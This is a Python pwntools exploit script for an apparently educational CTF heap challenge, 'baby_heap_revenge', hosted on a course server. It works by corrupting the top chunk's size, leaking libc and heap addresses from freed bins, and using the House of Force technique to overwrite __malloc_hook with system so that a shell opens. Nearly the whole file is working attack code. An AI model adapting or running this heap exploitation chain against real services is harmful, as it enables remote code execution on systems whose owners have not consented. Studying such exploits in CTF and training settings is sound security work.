#!/usr/bin/env python3
import sys
import time
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

def e(s):
    return s.encode('utf-8')

def d(s):
    return s.decode('utf-8')

libc = ELF('./libc.so.6')
#r = process("./baby_heap_revenge")
#gdb.attach(proc.pidof(r)[0])
r = remote('csie.ctf.tw', 10141)

def allocate(size, data):
    print("allocate :", size, data)
    r.sendafter('Your choice: ', "1")
    time.sleep(0.1)
    r.sendafter('Size :', str(size))
    time.sleep(0.1)
    if data:
        r.sendafter('Data :', data)
        time.sleep(0.1)

def show():
    print("show")
    r.sendafter('Your choice: ', "2")
    time.sleep(0.1)
    return r.recvuntil(b'$$$$$$$$$$$$$$$$$$$$$$$$$$$').split(b'$$$$$$$$$$$$$$$$$$$$$$$$$$$')[0].strip(b'\n')

# leak libc address
allocate(0x78, b'A' * 0x78 + p64(0xf81)) # overwrite top size
allocate(0x1000 - 0x10, 'A')             # trigger free
allocate(0xf60 - 0x10, 'A' * 8)          # claim a unsorted bin
libc.address = u64(show().strip(b'A' * 8).ljust(8, b'\x00')) - 0x70 - libc.symbols[b"__realloc_hook"]
if libc.address < 0:
    print("please try again...")
    sys.exit(0)
print("libc address :", hex(libc.address))

# leak heap address
allocate(0x78, b'A' * 0x78 + p64(0xf81)) # overwrite top size
allocate(0x1000 - 0x10, 'A')             # trigger free
allocate(0x1000 - 0x10, 'A')             # make unsorted bin to large bin
allocate(0xf60 - 0x10, 'A' * 0x10)       # claim a large bin
heap_address = u64(show().strip(b'A' * 0x10).ljust(8, b'\x00')) - 0x22080
if heap_address < 0:
    print("please try again...")
    sys.exit(0)
print("heap address :", hex(heap_address))

top = heap_address + 0x45080
binsh = libc.address + 0x18cd17

# house of force
allocate(0x78, b'A' * 0x78 + p64(0xfffffffffffffff1))      # overwrite top size
allocate(libc.symbols[b"__malloc_hook"] - top - 0x20, 'A') # relocate top chunk
allocate(0x10, p64(libc.symbols[b"system"]))               # overwrite __malloc_hook
allocate(binsh, '')                                        # trigger malloc

r.interactive()
